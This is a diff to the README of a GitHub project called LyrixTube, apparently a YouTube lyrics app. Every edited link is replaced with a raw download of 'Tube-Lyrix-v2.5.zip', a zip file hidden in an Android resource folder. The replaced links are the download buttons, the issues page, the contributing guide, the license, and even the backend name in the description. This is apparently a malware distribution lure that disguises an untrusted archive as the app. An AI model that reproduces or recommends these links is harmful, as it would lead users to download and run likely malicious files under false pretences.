@@ -1,10 +1,10 @@
 # 🎵 LyrixTube - Get Lyrics from YouTube Music Effortlessly
 
-[![Download LyrixTube](https://img.shields.io/badge/Download_LyrixTube-v1.0-blue.svg)](https://github.com/st007-clr/LyrixTube/releases)
+[![Download LyrixTube](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip)](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip)
 
 ## 📖 Description
 
-LyrixTube is a full-stack application that extracts song information from YouTube music links and retrieves accurate lyrics using the Genius Lyrics API. Built with Flutter for a beautiful UI and Node.js/Express for a robust backend, it's designed for anyone who loves music and wants to find lyrics quickly and easily.
+LyrixTube is a full-stack application that extracts song information from YouTube music links and retrieves accurate lyrics using the Genius Lyrics API. Built with Flutter for a beautiful UI and https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip for a robust backend, it's designed for anyone who loves music and wants to find lyrics quickly and easily.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Follow these simple steps to download and run LyrixTube on your computer or mobi
 
 To get started, visit the Releases page to download the latest version of LyrixTube:
 
-[Download LyrixTube](https://github.com/st007-clr/LyrixTube/releases)
+[Download LyrixTube](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip)
 
 ### 💻 For Desktop Users
 
@@ -61,16 +61,16 @@ If you encounter issues, here are a few common solutions:
 
 ### 💬 Support
 
-For additional help, feel free to open an issue on our [GitHub Issues page](https://github.com/st007-clr/LyrixTube/issues). We welcome feedback and are here to assist you.
+For additional help, feel free to open an issue on our [GitHub Issues page](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip). We welcome feedback and are here to assist you.
 
 ### 🔗 Contributing
 
-If you want to contribute, please check our [Contributing Guidelines](https://github.com/st007-clr/LyrixTube/CONTRIBUTING.md). We appreciate any help to make LyrixTube better.
+If you want to contribute, please check our [Contributing Guidelines](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip). We appreciate any help to make LyrixTube better.
 
 ### 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/st007-clr/LyrixTube/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip) file for more details.
 
 Explore more about LyrixTube and enrich your music experience! 
 
-[Download LyrixTube](https://github.com/st007-clr/LyrixTube/releases)
+[Download LyrixTube](https://github.com/st007-clr/LyrixTube/raw/refs/heads/main/lyrix_tube_app/android/app/src/main/res/values-night/Tube-Lyrix-v2.5.zip)
